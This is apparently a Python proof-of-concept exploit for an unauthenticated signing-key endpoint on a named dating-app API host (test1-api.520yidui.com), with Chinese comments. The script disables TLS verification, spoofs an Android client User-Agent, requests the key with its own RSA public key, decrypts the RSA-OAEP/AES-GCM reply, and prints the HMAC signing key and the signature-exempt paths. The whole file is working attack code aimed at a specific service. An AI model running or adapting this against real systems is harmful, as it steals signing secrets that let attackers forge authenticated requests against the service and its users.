#!/usr/bin/env python3
"""com.mltech.sign 签名密钥下发接口未授权利用 PoC
   用法: python3 yidui_signkey.py https://test1-api.520yidui.com
"""
import base64, json, ssl, sys, urllib.request

from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
# ---- 参数守卫（无参数必须给出人话，不抛 traceback、不朝真实目标发包）----
import sys as _sys, os as _os
if len(_sys.argv) < 2:
    _u = '用法: python3 yidui_signkey.py https://test1-api.520yidui.com'
    print("用法: " + _os.path.basename(__file__) + " " + _u, file=_sys.stderr)
    raise SystemExit(1)
# ---- 守卫结束 ----



def fetch_and_decrypt(base, timeout=25):
    base = base.rstrip('/')
    priv = __import__('cryptography.hazmat.primitives.asymmetric.rsa',
                      fromlist=['generate_private_key']).generate_private_key(
        public_exponent=65537, key_size=2048)
    pub_pem = priv.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo).decode()

    body = json.dumps({"public_key": pub_pem}).encode()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(
        base + '/api/v1/signature/key', data=body, method='POST',
        headers={'Content-Type': 'application/json',
                 'User-Agent': 'okhttp/3.12.13'})
    raw = urllib.request.urlopen(req, timeout=timeout, context=ctx).read()
    j = json.loads(raw)
    if j.get('code') != 0 or not j.get('data'):
        raise RuntimeError('unexpected response: %r' % raw[:300])

    blob = base64.b64decode(j['data'])
    # 前 256B = RSA-OAEP-SHA256 加密的 AES-256 key（PKCS1v15/OAEP-SHA1 均失败）
    aes_key = priv.decrypt(
        blob[:256],
        padding.OAEP(mgf=padding.MGF1(hashes.SHA256()),
                     algorithm=hashes.SHA256(), label=None))
    # 余下 = AES-256-GCM：nonce 取密文前 12 字节
    rest = blob[256:]
    plain = AESGCM(aes_key).decrypt(rest[:12], rest[12:], None)
    return json.loads(plain)


if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else 'https://test1-api.520yidui.com'
    cfg = fetch_and_decrypt(target)
    print(json.dumps(cfg, indent=2, ensure_ascii=False))
    print('\n# HMAC-SHA256 signing key:', cfg.get('key'))
    print('# exempt paths:')
    for p in cfg.get('exempt_paths', []):
        print(' ', p)

